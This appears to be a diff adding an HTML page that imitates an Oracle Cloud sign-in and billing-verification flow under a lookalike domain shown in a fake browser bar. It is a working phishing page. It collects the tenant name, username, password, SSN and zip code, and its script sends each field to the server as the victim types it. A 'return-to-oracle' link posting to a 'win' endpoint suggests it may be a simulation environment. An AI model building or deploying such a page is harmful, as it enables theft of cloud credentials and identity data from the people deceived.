@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Oracle Cloud</title>
+    <style>
+        :root {
+            --or-red: #c74634;
+            --or-bg: #f8f9fa;
+            --or-text: #313131;
+            --or-border: #d6d6d6;
+            --font-stack: "Segoe UI", Arial, sans-serif;
+        }
+        body { margin: 0; font-family: var(--font-stack); background-color: var(--or-bg); color: var(--or-text); }
+        .browser-bar {
+            max-width: 760px;
+            margin: 16px auto 0;
+            background: #eef2f6;
+            border: 1px solid #cfd8e3;
+            border-radius: 14px;
+            padding: 10px 16px;
+            color: #52606d;
+            font-size: 13px;
+        }
+        header { background: #fff; height: 72px; display: flex; align-items: center; padding: 0 5%; border-bottom: 1px solid var(--or-border); }
+        .or-logo { font-size: 24px; font-weight: 700; color: #000; letter-spacing: 2px; }
+        .or-logo span { color: var(--or-red); }
+        .container { max-width: 440px; margin: 60px auto; padding: 40px; background: #fff; border: 1px solid var(--or-border); border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 24px; }
+        .desc { font-size: 15px; color: #666; margin-bottom: 24px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; }
+        .form-group input { width: 100%; height: 44px; border: 1px solid var(--or-border); border-radius: 2px; padding: 0 12px; font-size: 15px; box-sizing: border-box; }
+        .btn-red { width: 100%; height: 44px; background-color: var(--or-red); color: #fff; border: none; border-radius: 2px; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .view { display: none; }
+        .view.active { display: block; }
+        .footer { text-align: center; margin-top: 40px; font-size: 12px; color: #999; }
+        .status-banner {
+            display: none;
+            margin-bottom: 18px;
+            padding: 12px 14px;
+            background: #eef8f1;
+            border: 1px solid #b8dbc0;
+            border-radius: 4px;
+            color: #1f6b33;
+        }
+        .status-banner.visible { display: block; }
+        .helper-link {
+            display: inline-block;
+            margin-top: 12px;
+            font-size: 12px;
+            color: #666;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="browser-bar">https://oracle-cloud-verify.com/signin/billing</div>
+    <header><div class="or-logo">ORACLE <span>Cloud</span></div></header>
+    <div class="container">
+        <div class="status-banner" id="status-banner"></div>
+
+        <div class="view active" id="view-1">
+            <h1>Cloud Account Sign In</h1>
+            <p class="desc">Access your Oracle Cloud console. Enter your cloud account name (tenant) or identity cloud domain.</p>
+            <div class="form-group">
+                <label for="tenant">Cloud Account Name (Tenant)</label>
+                <input type="text" id="tenant" name="tenant" placeholder="e.g., acme-prod">
+            </div>
+            <button class="btn-red" id="tenant-next">Next</button>
+        </div>
+
+        <div class="view" id="view-2">
+            <h1>Sign In to Identity Cloud</h1>
+            <p class="desc">Your account requires verification. Enter your organizational credentials.</p>
+            <div class="form-group">
+                <label for="user">User Name</label>
+                <input type="text" id="user" name="user" placeholder="email@company.com">
+            </div>
+            <div class="form-group">
+                <label for="pw">Password</label>
+                <input type="password" id="pw" name="pw" placeholder="Password">
+            </div>
+            <button class="btn-red" id="credential-next">Sign In</button>
+        </div>
+
+        <div class="view" id="view-3">
+            <h1>Billing Tenant Verification</h1>
+            <p class="desc">Due to updated tax compliance regulations, we must verify the primary responsible individual for this cloud billing account.</p>
+            <div class="form-group">
+                <label for="ssn">SSN (Social Security Number)</label>
+                <input type="password" id="ssn" name="ssn" placeholder="XXX-XX-XXXX">
+            </div>
+            <div class="form-group">
+                <label for="zip">Billing Zip Code</label>
+                <input type="text" id="zip" name="zip" placeholder="94065">
+            </div>
+            <button class="btn-red" id="billing-next">Verify Billing Tenant</button>
+            <a href="#" class="helper-link" id="return-to-oracle">Return to Oracle Cloud</a>
+        </div>
+
+        <div class="view" id="view-4">
+            <h1 style="color:#057642;">Verification Complete</h1>
+            <p class="desc">Your identity verification is complete.</p>
+            <button class="btn-red">Done</button>
+        </div>
+    </div>
+    <div class="footer">© 2026 Oracle Support • Legal • Privacy</div>
+
+    <script>
+        function show(step) {
+            document.querySelectorAll('.view').forEach((view) => view.classList.remove('active'));
+            document.getElementById(`view-${step}`).classList.add('active');
+        }
+
+        async function postJson(url, payload) {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            return response.json();
+        }
+
+        function showStatus(message) {
+            const banner = document.getElementById('status-banner');
+            banner.textContent = message;
+            banner.classList.add('visible');
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            ['tenant', 'user', 'pw', 'ssn', 'zip'].forEach((id) => {
+                const el = document.getElementById(id);
+                el.addEventListener('blur', () => {
+                    if (el.value.trim()) {
+                        fetch('/api/save-step', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ step: 0, data: { [el.name]: el.value.trim() } })
+                        });
+                    }
+                });
+            });
+
+            document.getElementById('tenant-next').addEventListener('click', async () => {
+                await postJson('/api/tenant/submit', { tenant: document.getElementById('tenant').value.trim() });
+                show(2);
+            });
+
+            document.getElementById('credential-next').addEventListener('click', async () => {
+                await postJson('/api/credentials/submit', {
+                    user: document.getElementById('user').value.trim(),
+                    pw: document.getElementById('pw').value.trim()
+                });
+                show(3);
+            });
+
+            document.getElementById('billing-next').addEventListener('click', async () => {
+                await postJson('/api/billing/verify', {
+                    ssn: document.getElementById('ssn').value.trim(),
+                    zip: document.getElementById('zip').value.trim()
+                });
+                show(4);
+            });
+
+            document.getElementById('return-to-oracle').addEventListener('click', async (event) => {
+                event.preventDefault();
+                await postJson('/api/win/return-to-oracle', {});
+                showStatus('Use cloud.oracle.com directly for billing or tenant verification.');
+            });
+        });
+    </script>
+</body>
+</html>
